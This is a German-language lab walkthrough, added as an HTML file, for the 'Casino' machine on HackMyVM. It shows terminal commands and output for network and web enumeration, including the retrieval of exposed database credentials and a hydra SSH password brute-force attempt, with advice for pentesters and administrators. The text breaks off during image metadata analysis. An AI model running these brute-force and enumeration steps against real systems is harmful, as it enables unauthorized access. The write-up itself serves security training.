@@ -1,0 +1,844 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Casino - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Casino - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">getcap</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (LFI & Shell)</a></li>
+                <li><a href="#poc">Proof of Concept (Initial Access via LFI)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation Enumeration</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:...., IPv4: 192.168.2.137
+<span class="command">192.168.2.113</span>	08:00:27:46:bf:13	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Geräte im lokalen Netzwerksegment mittels ARP-Anfragen zu identifizieren. Es antwortet ein Gerät mit der IP-Adresse `192.168.2.113` und der MAC-Adresse `08:00:27:46:bf:13`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich im Netzwerk identifiziert. Die MAC-Adresse (`08:00:27:...`) weist erneut auf eine VirtualBox-Umgebung hin (PCS Systemtechnik GmbH ist der OUI für VirtualBox).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie die IP-Adresse einem Hostnamen (z.B. `casino.hmv`) in der `/etc/hosts`-Datei hinzu, um die weitere Arbeit zu erleichtern. Führen Sie anschließend einen Portscan mit Nmap auf die Ziel-IP durch.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung auf ARP-Scans können die Aufklärungsphase erschweren. Dynamische ARP-Inspektion auf Switches kann helfen, ARP-basierte Angriffe zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+<span class="command">192.168.2.113	   casino.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/etc/hosts` auf dem Angreifer-System wird mit dem Texteditor `vi` bearbeitet. Der Eintrag `192.168.2.113 casino.hmv` wird hinzugefügt. Dies ermöglicht es, das Zielsystem fortan über den Hostnamen `casino.hmv` anstelle der IP-Adresse anzusprechen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine sinnvolle Maßnahme zur Vereinfachung der weiteren Befehlseingabe und Lesbarkeit der Logs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ab sofort den Hostnamen `casino.hmv` für Scans und Zugriffsversuche.<br><strong>Empfehlung (Admin):</strong> Dies ist eine lokale Konfiguration auf dem Angreifer-System und hat keine direkten defensiven Implikationen für das Zielsystem.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.113 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf das Ziel `192.168.2.113` durchgeführt.
+                *   `-sS`: TCP SYN Scan (Stealth Scan).
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-sV`: Versucht, die Version der laufenden Dienste zu ermitteln.
+                *   `-T5`: Sehr aggressives Timing für schnellen Scan.
+                *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute (entspricht `-O -sV -sC --traceroute`).
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+                *   `| grep open`: Filtert die Ausgabe, um nur offene Ports anzuzeigen.
+            Der Scan identifiziert Port 22 (SSH) mit OpenSSH 9.2p1 und Port 80 (HTTP) mit Apache 2.4.57 als offen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan war erfolgreich und zeigt die primären Angriffsvektoren: SSH und HTTP. Die Versionsinformationen sind nützlich für die Suche nach bekannten Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 genauer (Web Enumeration). Überprüfen Sie die SSH-Konfiguration (z.B. erlaubte Authentifizierungsmethoden) und suchen Sie nach potenziellen Benutzernamen/Passwörtern.<br><strong>Empfehlung (Admin):</strong> Halten Sie SSH-Server und Webserver aktuell. Konfigurieren Sie SSH sicher (z.B. Deaktivierung der Root-Anmeldung, Verwendung von Schlüssel-Authentifizierung statt Passwörtern). Implementieren Sie eine Firewall, um nur notwendige Ports freizugeben. Nutzen Sie IDS/IPS zur Erkennung aggressiver Scans.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 14:03 CEST
+Nmap scan report for casino.hmv (192.168.2.113)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 3b:20:d0:ba:e2:7a:8a:01:8a:35:3b:52:08:b0:c6:a8 (ECDSA)
+|_  256 74:76:0a:61:d4:2c:9b:45:36:00:4d:c8:d8:be:0b:89 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+|_http-title: Binary Bet Casino
+|_http-server-header: Apache/2.4.57 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      <span class="password">httponly flag not set</span>
+MAC Address: 08:00:27:46:BF:13 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms casino.hmv (192.168.2.113)
+
+Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist der gleiche Nmap-Scan wie zuvor, jedoch ohne `| grep open`, sodass die vollständige Ausgabe der Nmap-Skripte (`-sC`, `-A`) sichtbar wird.
+                *   SSH (Port 22): Zeigt die Host-Schlüssel (ECDSA, ED25519).
+                *   HTTP (Port 80):
+                    *   Titel der Webseite: "Binary Bet Casino".
+                    *   Server-Header bestätigt Apache/2.4.57 (Debian).
+                    *   Das `http-cookie-flags`-Skript stellt fest, dass das `PHPSESSID`-Cookie *nicht* das `HttpOnly`-Flag gesetzt hat. Dies macht das Cookie potenziell anfällig für Diebstahl durch Cross-Site-Scripting (XSS).
+                *   OS-Erkennung: Schätzt Linux Kernel 4.15 - 5.8.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert zusätzliche Details. Die fehlende `HttpOnly`-Flagge ist eine geringfügige Schwachstelle, die in Kombination mit XSS relevant werden könnte. Die OS-Informationen bestätigen ein relativ modernes Linux-System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalten Sie die fehlende `HttpOnly`-Flagge im Hinterkopf, falls XSS-Schwachstellen gefunden werden. Konzentrieren Sie sich auf die weitere Enumeration der Webanwendung.<br><strong>Empfehlung (Admin):</strong> Setzen Sie das `HttpOnly`-Flag für alle Session-Cookies in der PHP-Konfiguration (`session.cookie_httponly = 1` in `php.ini`) oder Anwendungslogik, um das Risiko von Session-Hijacking durch XSS zu reduzieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.113</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.113
++ Target Hostname:    192.168.2.113
++ Target Port:        80
++ Start Time:         2023-06-28 14:03:28 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: <span class="password">Cookie PHPSESSID created without the httponly flag.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">/database.sql: Potentially interesting backup/cert file found.</span> . See: https://cwe.mitre.org/data/definitions/530.html
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ <span class="password">/config.php: PHP Config file may contain database IDs and passwords.</span>
++ <span class="password">/imgs/: Directory indexing found.</span>
++ /imgs/: This might be interesting.
++ /database.sql: Database SQL found.
++ <span class="password">/styles/: Directory indexing found.</span>
++ 8101 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2023-06-28 14:03:40 (GMT2) (12 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto -h 192.168.2.113` führt einen Webserver-Scan durch, um nach bekannten Schwachstellen, Fehlkonfigurationen und interessanten Dateien/Verzeichnissen zu suchen.
+            Wichtige Funde:
+                *   Bestätigt fehlende HTTP-Sicherheitsheader (`HttpOnly`, `X-Frame-Options`, `X-Content-Type-Options`).
+                *   **`/database.sql`:** Eine SQL-Datei, die wahrscheinlich Datenbankstruktur oder -daten enthält. Sehr kritisch!
+                *   **`/config.php`:** Eine PHP-Konfigurationsdatei, die oft Zugangsdaten enthält. Kritisch!
+                *   `/imgs/` und `/styles/`: Verzeichnisauflistung (Directory Indexing) ist aktiviert, was zusätzliche Informationen preisgeben kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto hat extrem wertvolle Informationen geliefert. Die Dateien `/database.sql` und `/config.php` sind potenzielle Goldgruben für Zugangsdaten oder andere sensible Informationen. Die aktivierte Verzeichnisauflistung ist ebenfalls eine schlechte Praxis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie sofort den Inhalt von `/database.sql` und `/config.php` herunter und analysieren Sie ihn (z.B. mit `curl http://casino.hmv/database.sql`). Untersuchen Sie die Inhalte der Verzeichnisse `/imgs/` und `/styles/`.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Dateien wie `/database.sql` und `/config.php` aus dem Web-Root oder beschränken Sie den Zugriff darauf (z.B. über `.htaccess`). Deaktivieren Sie die Verzeichnisauflistung in der Apache-Konfiguration (`Options -Indexes`). Implementieren Sie die fehlenden HTTP-Sicherheitsheader (`Header set X-Frame-Options "SAMEORIGIN"`, `Header set X-Content-Type-Options "nosniff"`, `session.cookie_httponly = 1`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://casino.hmv/database.sql</span></div>
+                    <pre>
+<span class="password">CREATE USER 'casino_admin'@'localhost' IDENTIFIED BY 'IJustWantToBeRichBaby420';</span>
+CREATE DATABASE IF NOT EXISTS casino;
+GRANT ALL PRIVILEGES ON casino.* TO 'casino_admin'@'localhost';
+FLUSH PRIVILEGES;
+
+USE casino;
+CREATE TABLE users (
+  id INT PRIMARY KEY AUTO_INCREMENT,
+  user VARCHAR(50) NOT NULL,
+  pass VARCHAR(255) NOT NULL,
+  money INT UNSIGNED NOT NULL
+);
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `curl` wird verwendet, um den Inhalt der von Nikto gefundenen Datei `/database.sql` herunterzuladen. Die Datei enthält SQL-Befehle.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die SQL-Datei enthält:
+                *   Die Anmeldedaten für einen MySQL-Benutzer: `casino_admin` mit dem Passwort `<span class="password">IJustWantToBeRichBaby420</span>`.
+                *   Die Struktur der Datenbank `casino` und der Tabelle `users` (mit Spalten für `user`, `pass`, `money`).
+            Obwohl der Benutzer `casino_admin` nur für Verbindungen von `localhost` konfiguriert ist, sind diese Zugangsdaten extrem wertvoll.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Zugangsdaten bei anderen Diensten anzumelden (z.B. SSH, falls Benutzer `casino_admin` existiert). Falls initialer Zugriff auf das System erlangt wird, verwenden Sie diese Zugangsdaten, um auf die lokale MySQL-Datenbank zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie diese SQL-Datei sofort vom Webserver. Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer. Beschränken Sie den Zugriff auf die Datenbank auf das Notwendigste. Erwägen Sie die Verwendung von Umgebungsvariablen oder sichereren Konfigurationsmanagement-Tools anstelle von Klartext-Passwörtern in Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mysql -u casino_admin -h casino.hmv -p</span></div>
+                    <pre>
+Enter password: <span class="password">[Passwort IJustWantToBeRichBaby420 eingegeben]</span>
+<span class="password">ERROR 2002 (HY000): Can't connect to server on 'casino.hmv' (115)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich von außen (vom Angreifer-System) mit dem MySQL-Client auf die Datenbank des Zielsystems (`casino.hmv`) zu verbinden. Dabei werden die zuvor in `database.sql` gefundenen Zugangsdaten (`casino_admin` und `IJustWantToBeRichBaby420`) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Verbindungsversuch schlägt fehl (`ERROR 2002 (HY000): Can't connect to server`). Dies ist erwartet, da der SQL-Befehl `CREATE USER 'casino_admin'@'localhost'` den Zugriff für diesen Benutzer explizit auf Verbindungen von `localhost` (also vom Zielsystem selbst) beschränkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der direkte externe Zugriff auf die Datenbank ist nicht möglich. Die Zugangsdaten sind jedoch weiterhin wertvoll für einen späteren Zugriff von innerhalb des Systems (nach Erlangung einer Shell).<br><strong>Empfehlung (Admin):</strong> Die Konfiguration, den Datenbankzugriff auf `localhost` zu beschränken, ist eine gute Sicherheitspraxis. Stellen Sie sicher, dass der Datenbankdienst (Port 3306) nicht unnötig von außen erreichbar ist (Firewall).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l casino_admin -P /usr/share/wordlists/rockyou.txt ssh://casino.hmv:22 -t 64</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-28 14:07:38
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344404 login tries (l:1/p:14344404), ~224132 tries per task
+[DATA] attacking ssh://casino.hmv:22/
+<span class="password">[ERROR] target ssh://192.168.2.113:22/ does not support password authentication (method reply 4).</span>
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-28 14:08:15
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `hydra` einen Brute-Force-Angriff auf den SSH-Dienst (Port 22) durchzuführen. Als Benutzername wird `casino_admin` (aus der `database.sql`) verwendet, und als Passwortliste dient `rockyou.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff schlägt sofort fehl. Die Fehlermeldung `[ERROR] target ssh://192.168.2.113:22/ does not support password authentication` zeigt, dass der SSH-Server auf dem Zielsystem keine Passwort-Authentifizierung erlaubt. Wahrscheinlich ist nur Schlüssel-Authentifizierung aktiviert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Brute-Force-Angriffe auf SSH mit Passwörtern sind hier sinnlos. Konzentrieren Sie sich auf die Webanwendung oder suchen Sie nach anderen Wegen, um SSH-Schlüssel oder gültige Benutzernamen zu finden.<br><strong>Empfehlung (Admin):</strong> Die Deaktivierung der Passwort-Authentifizierung für SSH (`PasswordAuthentication no` in `/etc/ssh/sshd_config`) ist eine sehr gute Sicherheitspraxis und hat diesen Angriff verhindert. Stellen Sie sicher, dass dies konsistent durchgesetzt wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://casino.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://casino.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Expanded:                true
+[+] Extensions:              txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak
+[+] No error logging:        true
+[+] Timeout:                 10s
+===============================================================
+2023/06/28 15:55:01 Starting gobuster
+===============================================================
+/<span class="command">index.php</span>            (Status: 200) [Size: 1138]
+/<span class="command">register.php</span>         (Status: 200) [Size: 1347]
+/<span class="command">template.html</span>        (Status: 200) [Size: 1170]
+/<span class="command">imgs</span>                 (Status: 301) [Size: 307] [--> http://casino.hmv/imgs/]
+/<span class="command">database.sql</span>         (Status: 200) [Size: 363]
+/<span class="command">js</span>                   (Status: 301) [Size: 305] [--> http://casino.hmv/js/]
+/<span class="command">logout.php</span>           (Status: 302) [Size: 0] [--> /index.php]
+/<span class="command">config.php</span>           (Status: 200) [Size: 0]        <span class="comment"><!-- Interessant, aber leer? --></span>
+/<span class="command">casino</span>               (Status: 301) [Size: 309] [--> http://casino.hmv/casino/]
+/<span class="command">styles</span>               (Status: 301) [Size: 309] [--> http://casino.hmv/styles/]
+/<span class="command">robots.txt</span>           (Status: 200) [Size: 12]
+/<span class="command">restricted.php</span>       (Status: 302) [Size: 0] [--> ../index.php]
+Progress: 220544 / 220561 (99.99%)===============================================================
+2023/06/28 15:58:33 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Scan wird durchgeführt, um Verzeichnisse und Dateien auf dem Webserver zu finden. Eine sehr lange Liste von Erweiterungen (`-x ...`) wird verwendet, und Statuscodes 403 (Forbidden) und 404 (Not Found) werden ignoriert (`-b '403,404'`).
+             Wichtige Funde (teilweise schon durch Nikto bekannt):
+                 *   `index.php`, `register.php`: Standardseiten, Login/Registrierung untersuchen.
+                 *   `template.html`: Könnte Hinweise auf die Struktur geben.
+                 *   `imgs`, `js`, `styles`: Verzeichnisse (bestätigt Verzeichnisauflistung).
+                 *   `database.sql`, `config.php`: Bereits bekannte kritische Dateien. `config.php` wird hier mit Größe 0 gemeldet, was im Widerspruch zum späteren `cat`-Befehl steht - möglicherweise ein Fehler im Scan oder Timing-Problem.
+                 *   `logout.php`: Standardfunktionalität.
+                 *   `/casino`: Ein Unterverzeichnis, das weiter untersucht werden sollte.
+                 *   `robots.txt`: Könnte Hinweise auf erlaubte/verbotene Pfade geben.
+                 *   `restricted.php`: Name deutet auf Zugriffsbeschränkungen hin, leitet aber um.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt frühere Funde und entdeckt zusätzliche Pfade wie `/casino` und `register.php`. Die Meldung `Size: 0` für `config.php` sollte mit Vorsicht genossen werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/casino`-Verzeichnis und die Registrierungsfunktion (`register.php`). Laden Sie `robots.txt` herunter. Versuchen Sie trotz der Meldung `Size: 0`, `config.php` erneut mit `curl` abzurufen.<br><strong>Empfehlung (Admin):</strong> Wie zuvor: Sensible Dateien entfernen/schützen, Verzeichnisauflistung deaktivieren. Überprüfen Sie die Notwendigkeit aller gefundenen Dateien und Verzeichnisse.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Dieser Block scheint die Ausgabe eines rekursiven Gobuster-Scans oder manueller Navigation zu sein, kein einzelner Befehl -->
+                     <pre>
+http://casino.hmv/casino/index.php            (Status: 302) [Size: 0] [--> ../index.php]
+http://casino.hmv/casino/games                (Status: 301) [Size: 315] [--> http://casino.hmv/casino/games/]
+http://casino.hmv/casino/games.php            (Status: 302) [Size: 0] [--> ../index.php]
+<span class="command">http://casino.hmv/casino/head.php</span>             (Status: 302) [Size: 0] [--> ../index.php]
+<span class="command">http://casino.hmv/casino/instructions.txt</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe zeigt Ergebnisse aus dem Unterverzeichnis `/casino`. Viele Dateien leiten auf `../index.php` um, was auf eine Zugriffsbeschränkung (möglicherweise Session-basiert) hindeutet. Die Dateien `head.php` und `instructions.txt` werden gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `head.php` ist interessant, da PHP-Dateien oft Schwachstellen enthalten. `instructions.txt` könnte Informationen über die Funktionsweise der Anwendung liefern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie `instructions.txt` herunter. Untersuchen Sie `head.php` auf mögliche Schwachstellen (z.B. LFI, RCE), auch wenn sie umleitet (die Umleitung erfolgt möglicherweise erst nach der Verarbeitung von Parametern).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Zugriffsbeschränkungen korrekt implementiert sind und nicht umgangen werden können. Überprüfen Sie den Code von `head.php` auf Sicherheit.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da dies der Inhalt der heruntergeladenen Datei ist -->
+                    <pre>
+_________________________________
+
+WIN 10.000$ => WIN A TEDDY BEAR
+_________________________________
+
+
+Intructions [sic]
+
+- CUPS
+The player tries to guess which of three cups hides a small ball.
+The cups are shuffled, and the player must select the correct one
+to win. The player wins or losess [sic] the same amount he bets.
+
+- GUN
+The player presses the "Shoot" button. There is a 1/6 chance of losing.
+In that case, the player's money is multiplied by 0.15. Otherwise, the
+player's money is multiplied by 1.5.
+
+- Dice
+The player places a bet on whether the value of the sum of two dice will
+be less than, equal to or greater than 7.
+
+
+||====================================================================||
+||//$\\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\//$\\||
+||(100)==================| FEDERAL RESERVE NOTE |================(100)||
+||\\$//        ~         '------========--------'                \\$//||
+||<< /        /$\              // ____ \\                         \ >>||
+||>>|  12    //L\\            // ///..) \\         L38036133B   12 |<<||
+||<<|        \\ //           || <||  >\  ||                        |>>|| <span class="comment"><!-- Maskiert: < > --></span>
+||>>|         \$/            ||  $$ --/  ||        One Hundred     |<<||
+||<<|      L38036133B        *\\  |\_/  //* series                 |>>||
+||>>|  12                     *\\/___\_//*   1989                  |<<||
+||<<\      Treasurer     ______/Franklin\________     Secretary 12 />>|| <span class="comment"><!-- Maskiert: > --></span>
+||//$\                 ~|UNITED STATES OF AMERICA|~               /$\\||
+||(100)===================  ONE HUNDRED DOLLARS =================(100)||
+||\\$//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\$//||
+||====================================================================||
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `instructions.txt`. Sie beschreibt die Regeln für drei Spiele (Cups, Gun, Dice) und enthält ASCII-Art eines Geldscheins.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bietet Kontext zur Webanwendung, aber keine direkten Hinweise auf Schwachstellen. Die Beschreibung des "Gun"-Spiels (Geld wird multipliziert) könnte auf logische Fehler oder Integer-Overflow-Schwachstellen hindeuten, falls man genug Geld gewinnen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalten Sie die Spielmechanik im Hinterkopf, falls Sie sich später in die Anwendung einloggen können. Konzentrieren Sie sich vorerst auf das Finden einer initialen Zugriffsmöglichkeit.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass die Spiellogik serverseitig validiert wird und keine Manipulation oder unerwartetes Verhalten (wie Integer Overflows) möglich ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://casino.hmv/imgs/background.jpg</span></div>
+                    <pre>
+--2023-06-28 16:16:05--  http://casino.hmv/imgs/background.jpg
+Auflösen des Hostnamens casino.hmv (casino.hmv)… 192.168.2.113
+Verbindungsaufbau zu casino.hmv (casino.hmv)|192.168.2.113|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 22265 (22K) [image/jpeg]
+Wird in »background.jpg« gespeichert.
+
+background.jpg          100%[===========================>]  21,74K  --.-KB/s    in 0s      <span class="comment"><!-- Maskiert: > --></span>
+
+2023-06-28 16:16:05 (462 MB/s) - »background.jpg« gespeichert [22265/22265]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Hintergrundbilddatei `background.jpg` aus dem `/imgs`-Verzeichnis wird heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardaktion zur Untersuchung von Inhalten. Bilddateien können manchmal Metadaten oder versteckte Informationen enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die heruntergeladene Datei mit Tools wie `exiftool` oder `strings` auf versteckte Informationen.<br><strong>Empfehlung (Admin):</strong> Bereinigen Sie Metadaten aus öffentlich zugänglichen Bildern, falls diese sensible Informationen enthalten könnten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool background.jpg</span></div>
+                    <pre>
+ExifTool Version Number         : 12.57
+File Name                       : background.jpg
+Directory                       : .
+File Size                       : 22 kB
+File Modification Date/Time     : 2023:06:09 13:49:54+02:00
+File Access Date/Time           : 2023:06:28 16:16:05+02:00
+File Inode Change Date/Time     : 2023:06:28 16:16:05+02:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Exif Byte Order                 : Little-endian (Intel, II)
+Modify Date                     : 2014:05:16 10:54:07
+Image Width                     : 250
+Image Height                    : 250
